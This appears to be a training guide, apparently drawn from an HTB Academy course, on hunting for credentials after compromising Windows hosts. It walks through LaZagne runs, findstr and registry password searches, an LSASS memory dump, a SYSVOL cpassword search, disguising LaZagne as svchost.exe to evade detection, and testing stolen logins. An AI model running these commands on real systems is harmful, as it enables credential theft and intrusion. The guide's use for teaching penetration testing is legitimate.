# Credential Hunting in Windows

## 🎯 Overview

**Credential hunting** is the process of performing detailed searches across the file system and through various applications to discover credentials after gaining access to a Windows system. This post-exploitation technique can provide significant advantages by uncovering:

- **Stored application passwords** (browsers, email clients, FTP tools)
- **Configuration files** with embedded credentials
- **User documents** containing password lists
- **Script files** with hardcoded credentials
- **Windows credential stores** and password managers

> **"A user may have documented their passwords somewhere on the system. There may even be default credentials that could be found in various files."**

## 🧠 Search-Centric Methodology

### Context-Driven Approach
Before starting credential hunting, consider the **target system's purpose**:

- **IT Admin workstation** → Look for network device passwords, server credentials, documentation
- **Developer machine** → Search for database connections, API keys, deployment scripts
- **User workstation** → Focus on saved browser passwords, personal password files
- **Server system** → Check service accounts, configuration files, application credentials

### Strategic Questions
- What might the user be doing on a day-to-day basis?
- Which tasks require credentials?
- What applications are installed?
- What network resources does this system access?

## 🔍 Key Terms and Search Patterns

### Primary Keywords
```
Passwords
Passphrases
Keys
Username
User account
Creds
Users
Passkeys
Configuration
dbcredential
dbpassword
pwd
Login
Credentials
```

### Extended Search Terms
```bash
# Authentication-related
auth
authenticate
authentication
token
secret
api_key
access_token

# Database-related  
database
db_user
db_pass
connection_string
dsn

# Infrastructure
admin
administrator
root
service_account
ssh_key
private_key
```

## 🔧 Search Tools and Techniques

### 1. Windows Search (GUI)
**Use Case**: Quick desktop search for files containing credential keywords

```
1. Press Windows + S
2. Search for terms like:
   - "password"
   - "login" 
   - "creds"
   - "config"
3. Check file contents and locations
```

**Benefits**:
- ✅ Built-in, no additional tools needed
- ✅ Searches file contents, not just names
- ✅ Includes system settings and applications

**Limitations**:
- ❌ Limited to indexed locations
- ❌ May miss hidden or system files

### 2. LaZagne - Automated Credential Extraction

**LaZagne** is a powerful tool with **60+ modules** targeting different software for password extraction.

#### Core Module Categories

| Module | Description | Software Targets |
|--------|-------------|------------------|
| **browsers** | Web browser saved passwords | Chrome, Firefox, Edge, Opera, Safari |
| **chats** | Chat application credentials | Skype, Discord, Telegram |
| **databases** | Database connection strings | MySQL, PostgreSQL, SQLite |
| **games** | Gaming platform credentials | Steam, Battle.net |
| **git** | Git repository credentials | GitHub, GitLab tokens |
| **mail** | Email client passwords | Outlook, Thunderbird |
| **memory** | In-memory password dumps | KeePass, LSASS |
| **multimedia** | Media application creds | VLC, Spotify |
| **php** | PHP application passwords | Composer, PHPMyAdmin |
| **svn** | Subversion credentials | TortoiseSVN |
| **sysadmin** | System administration tools | WinSCP, PuTTY, OpenVPN, FileZilla |
| **windows** | Windows credential stores | Credential Manager, LSA Secrets |
| **wifi** | Wireless network passwords | Saved WiFi profiles |

#### LaZagne Usage

```bash
# Transfer LaZagne to target (via RDP copy/paste or file transfer)
# Download from: https://github.com/AlessandroZ/LaZagne

# Run all modules
C:\temp> LaZagne.exe all

# Verbose output to see what's happening
C:\temp> LaZagne.exe all -vv

# Target specific modules
C:\temp> LaZagne.exe browsers
C:\temp> LaZagne.exe sysadmin
C:\temp> LaZagne.exe windows

# Output to file
C:\temp> LaZagne.exe all -oN results.txt
```

#### Example LaZagne Output
```
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: bob ##########

------------------- Winscp passwords -----------------
[+] Password found !!!
URL: 10.129.202.51
Login: admin  
Password: SteveisReallyCool123
Port: 22

------------------- Chrome passwords -----------------
[+] Password found !!!
URL: https://gitlab.company.com
Login: bob.smith
Password: SecretGitLabToken123

------------------- Firefox passwords -----------------
[+] Password found !!!
URL: https://switches.company.local
Login: netadmin
Password: Switch3sAr3Gr3at!
```

### 3. findstr - Command Line Pattern Searching

**findstr** allows flexible pattern matching across multiple file types.

#### Basic findstr Syntax
```cmd
# Search for "password" in text files
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config

# Multiple patterns
findstr /SIM /C:"password" /C:"login" /C:"pwd" *.txt *.xml *.ps1

# Case-insensitive search in all file types
findstr /I /S /M "password" *.*
```

#### Advanced findstr Patterns
```cmd
# Network credentials
findstr /SIM /C:"ssh" /C:"ftp" /C:"rdp" *.txt *.cfg *.ps1 *.bat

# Database connections
findstr /SIM /C:"connectionstring" /C:"server=" /C:"database=" *.config *.xml

# API keys and tokens
findstr /SIM /C:"api_key" /C:"token" /C:"secret" *.json *.txt *.ps1

# Email credentials
findstr /SIM /C:"smtp" /C:"imap" /C:"pop3" *.txt *.xml *.config

# Git credentials
findstr /SIM /C:"github" /C:"gitlab" /C:"git clone" *.txt *.ps1 *.bat
```

#### findstr Flags Explained
```
/S    - Search subdirectories recursively
/I    - Case-insensitive search
/M    - Print only filenames with matches
/C    - Literal search string (use quotes)
/N    - Print line numbers
/V    - Print lines that don't match
```

### 4. PowerShell Search Techniques

```powershell
# Search file contents
Get-ChildItem -Recurse -Include *.txt,*.xml,*.config | Select-String -Pattern "password|login|cred"

# Search for specific file types
Get-ChildItem -Recurse -Name | Where-Object {$_ -like "*password*" -or $_ -like "*cred*"}

# Search registry for stored credentials
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Search for saved RDP connections
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Terminal Server Client\Servers"
```

## 📂 High-Value Target Locations

### File System Locations
```bash
# User directories
C:\Users\%USERNAME%\Documents\
C:\Users\%USERNAME%\Desktop\
C:\Users\%USERNAME%\Downloads\

# Common password files
C:\Users\%USERNAME%\Documents\passwords.txt
C:\Users\%USERNAME%\Desktop\creds.txt
C:\temp\pass.txt
C:\scripts\config.xml

# Application directories
C:\Program Files\FileZilla\
C:\Program Files\WinSCP\
C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\
C:\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles\
```

### Registry Locations
```cmd
# Windows autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Stored credentials
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"

# VNC passwords
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password
```

### Network Share Locations
```bash
# SYSVOL share (Domain environments)
\\domain.local\SYSVOL\domain.local\scripts\
\\domain.local\SYSVOL\domain.local\Policies\

# IT shares
\\fileserver\IT$\scripts\
\\fileserver\admin$\configs\
\\fileserver\shared\documentation\
```

## 🏢 Enterprise-Specific Locations

### Group Policy and Domain Assets
```bash
# Group Policy passwords (deprecated but still found)
\\domain.local\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml

# Login scripts
\\domain.local\SYSVOL\domain.local\scripts\*.bat
\\domain.local\SYSVOL\domain.local\scripts\*.ps1

# GPP password search
findstr /S /I cpassword \\domain.local\sysvol\domain.local\*.xml
```

### Development and IT Infrastructure
```bash
# Web.config files (development systems)
findstr /SIM /C:"connectionString" /C:"appSettings" *.config

# Unattend.xml (Windows deployment)
C:\Windows\Panther\unattend.xml
C:\Windows\System32\sysprep\unattend.xml

# KeePass databases
*.kdbx files on user systems and shares

# SharePoint and file shares
passwords.docx, passwords.xlsx, creds.txt on network drives
```

### Active Directory User Descriptions
```powershell
# Check AD user descriptions for passwords
Get-ADUser -Filter * -Properties Description | Where {$_.Description -ne $null}

# LDAP query for descriptions containing password patterns
(& (objectCategory=person)(objectClass=user)(description=*pass*))
```

## 🎯 Systematic Credential Hunting Methodology

### Initial Reconnaissance and Planning

Before beginning credential hunting, assess the target environment:

#### System Purpose Assessment
```cmd
# Check installed applications
wmic product get name
Get-WmiObject -Class Win32_Product | Select-Object Name

# Review running services
net start
Get-Service | Where-Object {$_.Status -eq "Running"}

# Check network connections
netstat -ano
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}
```

#### User Context Analysis
```cmd
# Current user information
whoami /all
net user %username%

# Check group memberships
net user %username% /domain
whoami /groups

# Review login history
wevtutil qe Security /q:"*[System[(EventID=4624)]]" /f:text /c:10
```

### Credential Discovery Workflow

#### Phase 1: Automated Discovery
```cmd
# Step 1: Transfer and run LaZagne
# Download from: https://github.com/AlessandroZ/LaZagne/releases
C:\temp> LaZagne.exe all -vv

# Step 2: Target specific modules based on discovered applications
C:\temp> LaZagne.exe browsers      # Web credentials
C:\temp> LaZagne.exe sysadmin      # IT tools (WinSCP, PuTTY, etc.)
C:\temp> LaZagne.exe mail          # Email credentials
C:\temp> LaZagne.exe databases     # Database connections
```

#### Phase 2: Manual File System Search
```cmd
# Search for common credential files
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.yml *.json

# Network infrastructure credentials
findstr /SIM /C:"ssh" /C:"telnet" /C:"router" /C:"switch" *.txt *.cfg *.ps1

# Development credentials
findstr /SIM /C:"api_key" /C:"secret" /C:"token" /C:"connectionstring" *.config *.json *.xml

# Service account credentials
findstr /SIM /C:"service" /C:"account" /C:"admin" *.txt *.ps1 *.bat
```

#### Phase 3: Registry and System Analysis
```cmd
# Check stored credentials
cmdkey /list
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"

# VNC passwords
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

# Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Application-specific searches
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

### Application-Specific Hunting Techniques

#### Browser Credential Extraction
```cmd
# Chrome passwords (requires user context)
LaZagne.exe browsers -v

# Firefox manual search
dir /s "key*.db" "logins.json" "signons.sqlite"

# Edge credentials
LaZagne.exe browsers -v | findstr -i edge
```

#### Network Administration Tools
```cmd
# WinSCP stored sessions
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s

# PuTTY saved sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# FileZilla credentials
dir /s "recentservers.xml" "sitemanager.xml"
type "%APPDATA%\FileZilla\recentservers.xml"
```

#### Development Environment Credentials
```cmd
# Git credentials
findstr /SIM /C:"github" /C:"gitlab" /C:"git clone" *.txt *.ps1 *.bat
dir /s ".git" "config"

# Database connection strings
findstr /SIM /C:"server=" /C:"uid=" /C:"password=" *.config *.xml *.json

# Environment configuration
findstr /SIM /C:"env" /C:"config" /C:"settings" *.json *.ini *.cfg
```

### Advanced Discovery Techniques

#### Memory-Based Credential Extraction
```cmd
# Process memory dumps (requires elevated privileges)
procdump -ma lsass.exe lsass.dmp

# KeePass memory extraction
LaZagne.exe memory -v

# Application process dumps
tasklist | findstr -i "keepass\|password\|vault"
```

#### Network Share Enumeration
```cmd
# Local shares
net share

# Domain shares (if domain-joined)
net view \\domain-controller
net view /domain

# SYSVOL search for Group Policy passwords
findstr /S /I cpassword \\domain.local\sysvol\domain.local\*.xml
```

#### Alternative Data Streams and Hidden Files
```cmd
# Check for alternate data streams
dir /R C:\Users\%USERNAME%\Documents\

# Hidden files search
dir /AH /S C:\Users\%USERNAME%\

# System files containing credentials
type C:\Windows\Panther\unattend.xml | findstr /i password
type C:\Windows\System32\sysprep\unattend.xml | findstr /i password
```

### Documentation and Validation

#### Credential Organization
```
# Create structured credential inventory
Date: [timestamp]
Target: [hostname/IP]
User Context: [username/privileges]

Found Credentials:
[Service/Application] | [Username] | [Password/Hash] | [Location] | [Validated]
SSH Switches         | netadmin   | P@ssw0rd123    | config.txt | YES
GitLab              | developer  | token123       | browser    | NO
WinSCP              | admin      | secret456      | registry   | YES
```

#### Immediate Validation
```cmd
# Test SSH credentials
ssh username@target-ip

# Test WinSCP/FTP credentials
ftp target-ip

# Test database connections
sqlcmd -S server -U username -P password -Q "SELECT @@VERSION"

# Test web application access
curl -u username:password https://target/api/test
```

## 🛡️ Detection and Evasion

### Common Detection Methods
- **File access monitoring** - Unusual file access patterns
- **Process monitoring** - LaZagne execution
- **Network monitoring** - Data exfiltration
- **Registry monitoring** - Credential store access

### Evasion Techniques
```cmd
# Use legitimate Windows tools
findstr instead of custom tools when possible

# Rename LaZagne
ren LaZagne.exe svchost.exe

# Use PowerShell for stealth
Get-Content -Path "file.txt" | Select-String "password"

# Time-delay searches
timeout /t 5 && findstr /SIM "password" *.txt
```

## 🎯 Success Metrics and Validation

### Credential Quality Assessment
```bash
# Test discovered credentials immediately
net use \\target\share /user:domain\username password

# SSH validation
ssh username@target_ip

# Database connection test
sqlcmd -S server -U username -P password
```

### Documentation Format
```
# Credential Discovery Log
Date: [timestamp]
Target: [hostname/IP]
Method: [LaZagne/findstr/manual]
Location: [file path/registry key]
Credential: [username:password]
Service: [SSH/WinSCP/GitLab/etc]
Validated: [Yes/No]
```

## 📋 Quick Reference Checklist

### Initial Assessment
- [ ] Identify system purpose (admin/dev/user workstation)
- [ ] Note installed applications
- [ ] Check user privilege level
- [ ] Identify network connectivity

### Automated Tools
- [ ] Transfer and run LaZagne with all modules
- [ ] Save LaZagne output to file
- [ ] Focus on high-value modules (browsers, sysadmin, windows)

### Manual Searches
- [ ] findstr for common password patterns
- [ ] Search user Documents and Desktop
- [ ] Check Downloads folder for password files
- [ ] Review browser bookmarks for service URLs

### Advanced Techniques  
- [ ] Registry searches for stored credentials
- [ ] Network share enumeration (if domain-joined)
- [ ] Configuration file analysis
- [ ] Memory dumps (if elevated privileges)

### Validation
- [ ] Test discovered credentials immediately
- [ ] Document all findings with timestamps
- [ ] Note credential sources for reporting
- [ ] Identify high-value targets for further exploitation

## 💡 Key Takeaways

1. **Context is king** - Understanding the system's purpose guides search strategy
2. **LaZagne is powerful** - 60+ modules make it essential for Windows credential hunting
3. **findstr is versatile** - Native tool with powerful pattern matching
4. **Multiple approaches** - Combine automated tools with manual searches
5. **Document everything** - Track credential sources and validation status
6. **Test immediately** - Validate credentials as soon as they're found
7. **Think like the user** - Where would you store passwords if you were them?

---

*This guide provides comprehensive coverage of credential hunting techniques for Windows environments, based on HTB Academy's Password Attacks module.* 